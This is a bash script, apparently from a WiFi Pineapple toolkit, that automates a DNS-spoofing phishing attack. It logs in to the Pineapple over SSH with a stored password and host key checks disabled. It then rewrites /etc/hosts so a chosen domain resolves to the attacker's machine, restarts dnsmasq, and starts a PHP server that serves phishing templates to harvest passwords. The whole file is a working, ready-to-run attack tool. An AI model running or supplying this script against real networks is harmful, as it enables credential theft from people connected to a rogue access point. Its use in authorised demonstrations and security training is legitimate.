#!/bin/bash
#
# DOCUMENTATION
# How Hackers Use DNS Spoofing to Phish Passwords (WiFi Pineapple Demo)
# https://www.youtube.com/watch?v=33H0ILk-yd8
#
# INSTALLATION
# apt-get install jq php7.4-cli sshpass
#

banner() {
    echo ""
    printf "\t\t\t\t    0\n"
    printf "\t\t\t\t    |\n"
    printf "\t\t\t\t{}====={}\n"
    printf "\t\t\t\t    |\n"
    printf "\t\t\t\t    |\n"
    printf "\t\t\t\t|   |   |\n"
    printf "\t\t\t\t|___|___|\n"
    echo ""
    echo "------------------------------------------------------------------------------"
    echo "* Author: TW-D"
    echo "* Version: 1.0.0"
    echo "* Documentation: https://github.com/TW-D"
    echo "------------------------------------------------------------------------------"
}

banner

set -eo pipefail

readonly BGREEN='\033[1;32m'
readonly BBLUE='\033[1;34m'
readonly BRED='\033[1;31m'
readonly NC='\033[0m'

readonly CONFIGURATION_FILE="./configuration.json"

if [ -f "${CONFIGURATION_FILE}" ]
then
    readonly PINEAPPLE_PASSWORD="$(cat ${CONFIGURATION_FILE} | jq -r '.PINEAPPLE_PASSWORD')"
    readonly PINEAPPLE_PORT="$(cat ${CONFIGURATION_FILE} | jq -r '.PINEAPPLE_PORT')"
    readonly PINEAPPLE_USERNAME="root"
    readonly PINEAPPLE_IP="$(cat ${CONFIGURATION_FILE} | jq -r '.PINEAPPLE_IP')"
else
    printf "[-] ${BRED}The file '${CONFIGURATION_FILE}' cannot be found.${NC}\n"
    exit 2
fi

readonly LOCAL_IP="${1}"
readonly PHISHING_DOMAIN="${2}"
readonly PHISHING_PORT="${3}"

set -u

usage() {
    local script_name
    script_name=$(basename "${0}")
    echo "${BASH} ./${script_name} <LOCAL_IP> <PHISHING_DOMAIN> <PHISHING_PORT>"
}

if [ -z "${LOCAL_IP}" ]; then
    printf "[-] ${BRED}No LOCAL_IP has been defined.${NC}\n"
    usage
    exit 2
fi

if [ -z "${PHISHING_DOMAIN}" ]; then
    printf "[-] ${BRED}No PHISHING_DOMAIN has been defined.${NC}\n"
    usage
    exit 2
fi

if [ -z "${PHISHING_PORT}" ]; then
    printf "[-] ${BRED}No PHISHING_PORT has been defined.${NC}\n"
    usage
    exit 2
fi

execution() {
    sshpass -p "${PINEAPPLE_PASSWORD}" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking="no" -o UserKnownHostsFile="/dev/null" -p "${PINEAPPLE_PORT}" -q "${PINEAPPLE_USERNAME}@${PINEAPPLE_IP}" "${1}"
}

download() {
    sshpass -p "${PINEAPPLE_PASSWORD}" scp -o StrictHostKeyChecking="no" -o UserKnownHostsFile="/dev/null" -P "${PINEAPPLE_PORT}" -q "${PINEAPPLE_USERNAME}@${PINEAPPLE_IP}:${1}" "${2}"
}

phishing() {
    if [ "$(id -u)" != 0 ]; then
        printf "[-] ${BRED}'root' privileges are needed.${NC}\n"
    else
        php -S "${LOCAL_IP}:${PHISHING_PORT}" -t ./templates/
    fi
}

if execution "exit 0";
then

    printf "[+] ${BGREEN}List of files containing 'hosts' in '/etc/' before saving${NC}\n"
    execution "/bin/ls -l /etc/hosts*"

    printf "[+] ${BBLUE}Backup of '/etc/hosts'${NC}\n"
    backup_hosts="hosts_$(/bin/date +"%F_%H-%M-%S").bak"
    execution "/bin/cp /etc/hosts /tmp/${backup_hosts}"
    download "/tmp/${backup_hosts}" "./backups/${backup_hosts}"

    printf "[+] ${BGREEN}List of files containing 'hosts' in './backups/' after saving${NC}\n"
    ls -l ./backups/hosts*

    printf "[+] ${BGREEN}Contents of '/etc/hosts' before adding a new DNS record${NC}\n"
    execution "cat /etc/hosts"

    printf "[+] ${BBLUE}Adding a new DNS record${NC}\n"
    execution "/bin/sed '2 s/^/'${LOCAL_IP}' '${PHISHING_DOMAIN}'\n/' /tmp/${backup_hosts} > /etc/hosts"
    execution "/bin/rm /tmp/${backup_hosts}"

    printf "[+] ${BGREEN}Contents of '/etc/hosts' after adding a new DNS record${NC}\n"
    execution "cat /etc/hosts"

    printf "[+] ${BBLUE}Cancels all 'dnsmasq' processes${NC}\n"
    execution "/usr/bin/killall dnsmasq"

    printf "[+] ${BGREEN}Attempt to launch the 'dnsmasq' startup script${NC}\n"
    execution "/etc/init.d/dnsmasq start"

    if execution "/etc/init.d/dnsmasq status" -eq "running";
    then

        printf "[+] ${BBLUE}The startup script 'dnsmasq' was successfully launched${NC}\n"

        printf "[+] ${BGREEN}Queries DNS records for a given domain name${NC}\n"
        execution "/usr/bin/nslookup ${PHISHING_DOMAIN}"

        printf "[+] ${BGREEN}Web server startup for phishing attack${NC}\n"
        phishing

    else

        printf "[-] ${BRED}The startup script 'dnsmasq' has not been run.${NC}\n"

    fi

else
    printf "[-] ${BRED}SSH connection attempt failed.${NC}\n"
fi